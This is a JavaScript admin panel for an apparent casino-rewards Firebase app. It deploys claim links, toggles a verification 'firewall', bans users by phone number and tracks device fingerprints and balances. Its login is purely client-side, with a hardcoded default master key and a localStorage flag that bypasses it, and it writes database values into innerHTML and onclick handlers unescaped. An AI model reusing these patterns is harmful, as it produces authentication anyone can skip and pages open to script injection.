/**
 * C.I.A. Command Center - Admin Panel
 * Complete with Global Firewall, Deploy Links, Ban Protocol
 */

// ========== FIREBASE CONFIGURATION ==========
const firebaseConfig = {
    apiKey: "AIzaSyCjTn-hyUdZGiDHsy5_ijYu6KQCYMElsTI",
    authDomain: "casinorewards-95502.firebaseapp.com",
    databaseURL: "https://casinorewards-95502-default-rtdb.firebaseio.com",
    projectId: "casinorewards-95502",
    storageBucket: "casinorewards-95502.firebasestorage.app",
    messagingSenderId: "768311187647",
    appId: "1:768311187647:web:e26e8a5134a003ef634e0a"
};

// Initialize Firebase
if (!firebase.apps.length) {
    firebase.initializeApp(firebaseConfig);
}
const db = firebase.database();
const SESSION_KEY = "cia_auth";
const REMEMBER_KEY = "cia_remembered";

// ========== GLOBAL FIREWALL STATE ==========
let globalFirewallActive = false;

// ========== TOGGLE DROPDOWN ==========
function toggleDropdown(id) {
    const el = document.getElementById(id);
    if (el) el.classList.toggle('open');
}

// ========== MASTER KEY POPUP ==========
function showMasterKeyPopup() { 
    const popup = document.getElementById('keyPopup');
    if (popup) popup.style.display = 'flex'; 
}
function closeKeyPopup() { 
    const popup = document.getElementById('keyPopup');
    if (popup) popup.style.display = 'none'; 
}

async function getMasterKey() {
    try {
        const snap = await db.ref('admin/masterKey').once('value');
        if (snap.exists()) return snap.val();
        await db.ref('admin/masterKey').set("CIA2024");
        return "CIA2024";
    } catch (error) {
        console.error("Firebase error:", error);
        return null;
    }
}

async function updateMasterKey() {
    const newKey = document.getElementById('popupNewKey').value.trim();
    if (!newKey || newKey.length < 4) return alert("Key must be at least 4 chars");
    if (confirm(`Change master key to "${newKey}"? You will be logged out.`)) {
        await db.ref('admin/masterKey').set(newKey);
        alert("Master key updated!");
        closeKeyPopup();
        localStorage.removeItem(REMEMBER_KEY);
        logout();
    }
}

// ========== GENERATE HASH FROM URL ==========
function generateHash(url) {
    if (!url) return '#00000000';
    let hash = 0;
    for (let i = 0; i < url.length; i++) {
        hash = ((hash << 5) - hash) + url.charCodeAt(i);
        hash |= 0;
    }
    return '#' + Math.abs(hash).toString(16).substring(0, 8);
}

// ========== LOGIN FUNCTIONS ==========
async function verifyAccess() {
    const errorDiv = document.getElementById('loginError');
    if (errorDiv) errorDiv.innerHTML = '';
    
    const input = document.getElementById('accessKey');
    const btn = event?.target;
    
    if (!input || !input.value) {
        if (errorDiv) errorDiv.innerHTML = "ENTER MASTER KEY!";
        return;
    }
    
    if (btn) {
        btn.disabled = true;
        btn.innerText = "VERIFYING...";
    }
    
    try {
        const masterKey = await getMasterKey();
        if (!masterKey) {
            if (errorDiv) errorDiv.innerHTML = "DATABASE ERROR!";
            return;
        }
        
        if (input.value === masterKey) {
            sessionStorage.setItem(SESSION_KEY, "true");
            localStorage.setItem(REMEMBER_KEY, "true");
            document.getElementById('loginOverlay').style.display = 'none';
            document.getElementById('dashboard').classList.add('active');
            loadStats();
            checkGlobalFirewallStatus();
        } else {
            if (errorDiv) errorDiv.innerHTML = "ACCESS DENIED!";
            db.ref('admin/failedAttempts').push({ timestamp: Date.now() });
        }
    } catch (error) {
        console.error("Login error:", error);
        if (errorDiv) errorDiv.innerHTML = "CONNECTION ERROR!";
    } finally {
        if (btn) {
            btn.disabled = false;
            btn.innerText = "AUTHORIZE";
        }
    }
}

function checkRememberedLogin() {
    if (localStorage.getItem(REMEMBER_KEY) === "true" || sessionStorage.getItem(SESSION_KEY) === "true") {
        sessionStorage.setItem(SESSION_KEY, "true");
        document.getElementById('loginOverlay').style.display = 'none';
        document.getElementById('dashboard').classList.add('active');
        loadStats();
        checkGlobalFirewallStatus();
        return true;
    }
    return false;
}

function logout() {
    sessionStorage.removeItem(SESSION_KEY);
    localStorage.removeItem(REMEMBER_KEY);
    document.getElementById('loginOverlay').style.display = 'flex';
    document.getElementById('dashboard').classList.remove('active');
    const accessKey = document.getElementById('accessKey');
    if (accessKey) accessKey.value = '';
}

// ========== DEPLOY LINKS ==========
function deploy() {
    const textarea = document.getElementById('links');
    if (!textarea) return;
    const val = textarea.value.trim();
    if (!val) return;
    
    val.split('\n').forEach(url => {
        if (url.trim()) {
            db.ref('links').push({
                url: url.trim(),
                hash: generateHash(url.trim()),
                status: 'available',
                user: 'NONE',
                createdAt: Date.now()
            });
        }
    });
    textarea.value = '';
}

function reuseLink(key) {
    if (confirm("Recycle this link?")) {
        db.ref('links/' + key).update({ status: 'available', user: 'NONE' });
    }
}

// ========== GLOBAL FIREWALL FUNCTIONS ==========
async function toggleFirewall() {
    const btn = document.getElementById('firewallToggleBtn');
    const statusMsg = document.getElementById('firewallStatusMsg');
    
    if (!globalFirewallActive) {
        if (confirm(`ACTIVATE GLOBAL FIREWALL?\n\nAll users will need verification before claiming.`)) {
            await db.ref('admin/globalFirewall').set({
                active: true,
                activatedBy: "ADMIN",
                timestamp: Date.now()
            });
            globalFirewallActive = true;
            btn.className = 'firewall-on';
            btn.innerHTML = '🔥 FIREWALL ON 🔥';
            statusMsg.innerHTML = 'GLOBAL FIREWALL ACTIVE - All users need verification';
            statusMsg.style.color = '#ff4444';
            btn.classList.add('fire-animation');
            alert(`🔥 GLOBAL FIREWALL ACTIVATED`);
        }
    } else {
        if (confirm(`DEACTIVATE GLOBAL FIREWALL?\n\nUsers will return to normal claiming.`)) {
            await db.ref('admin/globalFirewall').set({
                active: false,
                deactivatedBy: "ADMIN",
                timestamp: Date.now()
            });
            globalFirewallActive = false;
            btn.className = 'firewall-off';
            btn.innerHTML = '🔥 FIREWALL OFF';
            statusMsg.innerHTML = 'GLOBAL FIREWALL DEACTIVATED - Normal claiming';
            statusMsg.style.color = '#39ff14';
            btn.classList.remove('fire-animation');
            alert(`🔓 GLOBAL FIREWALL DEACTIVATED`);
        }
    }
}

async function checkGlobalFirewallStatus() {
    try {
        const snap = await db.ref('admin/globalFirewall').once('value');
        const data = snap.val();
        globalFirewallActive = (data && data.active === true);
        
        const btn = document.getElementById('firewallToggleBtn');
        const statusMsg = document.getElementById('firewallStatusMsg');
        
        if (globalFirewallActive) {
            if (btn) {
                btn.className = 'firewall-on';
                btn.innerHTML = '🔥 FIREWALL ON 🔥';
                btn.classList.add('fire-animation');
            }
            if (statusMsg) {
                statusMsg.innerHTML = 'GLOBAL FIREWALL ACTIVE - All users need verification';
                statusMsg.style.color = '#ff4444';
            }
        } else {
            if (btn) {
                btn.className = 'firewall-off';
                btn.innerHTML = '🔥 FIREWALL OFF';
                btn.classList.remove('fire-animation');
            }
            if (statusMsg) {
                statusMsg.innerHTML = 'GLOBAL FIREWALL DEACTIVATED - Normal claiming';
                statusMsg.style.color = '#39ff14';
            }
        }
        return globalFirewallActive;
    } catch (error) {
        console.error("Check global firewall error:", error);
        return false;
    }
}

// ========== BAN FUNCTIONS ==========
function banGhost() {
    const target = document.getElementById('banTarget');
    if (!target || !target.value.trim()) return;
    const phone = target.value.trim();
    if (confirm(`Terminate ${phone}? This will block the user permanently.`)) {
        db.ref('banned_ghosts/' + phone).set({ timestamp: Date.now(), bannedBy: "ADMIN" });
    }
    target.value = '';
}

function liftBan(id) {
    if (confirm(`Recover ${id}?`)) {
        db.ref('banned_ghosts/' + id).remove();
    }
}

function purgeGhost(phone) {
    if (confirm(`Delete data for ${phone}?`)) {
        db.ref('user_sessions/' + phone).remove();
    }
}

// ========== LOAD STATS ==========
async function loadStats() {
    try {
        const users = await db.ref('user_sessions').once('value');
        const usersCount = users.numChildren();
        const activeBadge = document.getElementById('activeUsersBadge');
        if (activeBadge) activeBadge.innerHTML = usersCount + " ACTIVE";
        
        const banned = await db.ref('banned_ghosts').once('value');
        const bannedCount = banned.numChildren();
        const bannedBadge = document.getElementById('bannedBadge');
        if (bannedBadge) bannedBadge.innerHTML = bannedCount + " BANNED";
    } catch (error) {
        console.error("Load stats error:", error);
    }
}

// ========== GET DEVICE DISPLAY ID ==========
async function getDeviceDisplayId(fingerprint) {
    if (!fingerprint || fingerprint === '---') return '---';
    
    const deviceMapRef = db.ref('device_id_map/' + fingerprint);
    const snap = await deviceMapRef.once('value');
    
    if (snap.exists()) {
        return snap.val().displayId;
    }
    
    const counterRef = db.ref('admin/deviceCounter');
    const counterSnap = await counterRef.once('value');
    let nextNum = (counterSnap.val() || 0) + 1;
    await counterRef.set(nextNum);
    
    const displayId = `Dev${nextNum}`;
    
    await deviceMapRef.set({
        displayId: displayId,
        createdAt: Date.now(),
        fingerprint: fingerprint
    });
    
    return displayId;
}

// ========== REAL-TIME LISTENERS ==========
db.ref('links').on('value', snap => {
    const tbody = document.getElementById('linkData');
    if (!tbody) return;
    tbody.innerHTML = '';
    snap.forEach(c => {
        const d = c.val();
        const statusClass = d.status === 'available' ? 'status-avail' : 'status-used';
        const displayHash = d.hash || generateHash(d.url || '');
        tbody.innerHTML += `<tr>
            <td>#${c.key.substr(-4)}</td>
            <td title="${d.url || ''}">${displayHash}</td>
            <td><span class="status ${statusClass}">${d.status}</span></td>
            <td class="ghost-id">${d.user === 'NONE' ? '---' : d.user}</td>
            <td>
                <button class="icon-btn" onclick="reuseLink('${c.key}')" style="color:var(--gold);">♻️</button>
                <button class="icon-btn" onclick="db.ref('links/${c.key}').remove()" style="color:var(--danger);">🗑️</button>
            </td>
        </tr>`;
    });
});

db.ref('user_sessions').on('value', async snap => {
    const tbody = document.getElementById('ghostData');
    if (!tbody) return;
    tbody.innerHTML = '';
    
    for (const c of snap.val() ? Object.entries(snap.val()) : []) {
        const d = c[1];
        const lastSeen = d.lastUpdate ? new Date(d.lastUpdate).toLocaleTimeString() : '---';
        const fingerprint = d.deviceFingerprint || '---';
        
        let deviceDisplay = '---';
        if (fingerprint !== '---') {
            deviceDisplay = await getDeviceDisplayId(fingerprint);
        }
        
        tbody.innerHTML += `<tr>
            <td class="ghost-id">${d.phone || '---'}</td>
            <td style="color:var(--ghost)">₱${(d.balance || 0).toLocaleString()}</td>
            <td style="color:var(--neon); font-weight:bold;">${deviceDisplay}</td>
            <td style="font-size:9px;">${lastSeen}</td>
            <td>
                <button class="icon-btn" onclick="document.getElementById('banTarget').value='${d.phone}';banGhost()" style="color:var(--neon);">🔨</button>
                <button class="icon-btn" onclick="purgeGhost('${d.phone}')" style="color:var(--danger);">💀</button>
            </td>
        </tr>`;
    }
    
    const activeBadge = document.getElementById('activeUsersBadge');
    if (activeBadge) activeBadge.innerHTML = (snap.numChildren() || 0) + " ACTIVE";
});

db.ref('banned_ghosts').on('value', snap => {
    const tbody = document.getElementById('banList');
    if (tbody) {
        tbody.innerHTML = `<tr><td colspan="2" style="text-align:center; color:var(--danger);">⚠️ ${snap.numChildren()} terminated record(s) in database</td></tr>`;
    }
    const bannedBadge = document.getElementById('bannedBadge');
    if (bannedBadge) bannedBadge.innerHTML = snap.numChildren() + " BANNED";
});

// ========== LISTEN FOR GLOBAL FIREWALL CHANGES (REAL-TIME) ==========
db.ref('admin/globalFirewall').on('value', (snap) => {
    const data = snap.val();
    globalFirewallActive = (data && data.active === true);
    
    const btn = document.getElementById('firewallToggleBtn');
    const statusMsg = document.getElementById('firewallStatusMsg');
    
    if (globalFirewallActive) {
        if (btn) {
            btn.className = 'firewall-on';
            btn.innerHTML = '🔥 FIREWALL ON 🔥';
            btn.classList.add('fire-animation');
        }
        if (statusMsg) {
            statusMsg.innerHTML = 'GLOBAL FIREWALL ACTIVE - All users need verification';
            statusMsg.style.color = '#ff4444';
        }
    } else {
        if (btn) {
            btn.className = 'firewall-off';
            btn.innerHTML = '🔥 FIREWALL OFF';
            btn.classList.remove('fire-animation');
        }
        if (statusMsg) {
            statusMsg.innerHTML = 'GLOBAL FIREWALL DEACTIVATED - Normal claiming';
            statusMsg.style.color = '#39ff14';
        }
    }
});

// ========== INITIALIZE ==========
if (localStorage.getItem(REMEMBER_KEY) === "true" || sessionStorage.getItem(SESSION_KEY) === "true") {
    sessionStorage.setItem(SESSION_KEY, "true");
    document.getElementById('loginOverlay').style.display = 'none';
    document.getElementById('dashboard').classList.add('active');
    loadStats();
    checkGlobalFirewallStatus();
}

// Enter key support for login
document.getElementById('accessKey')?.addEventListener('keypress', e => {
    if (e.key === 'Enter') verifyAccess();
});

// Expose functions globally
window.toggleDropdown = toggleDropdown;
window.showMasterKeyPopup = showMasterKeyPopup;
window.closeKeyPopup = closeKeyPopup;
window.updateMasterKey = updateMasterKey;
window.verifyAccess = verifyAccess;
window.logout = logout;
window.deploy = deploy;
window.reuseLink = reuseLink;
window.toggleFirewall = toggleFirewall;
window.banGhost = banGhost;
window.liftBan = liftBan;
window.purgeGhost = purgeGhost;
window.getGlobalFirewallStatus = function() { return globalFirewallActive; };
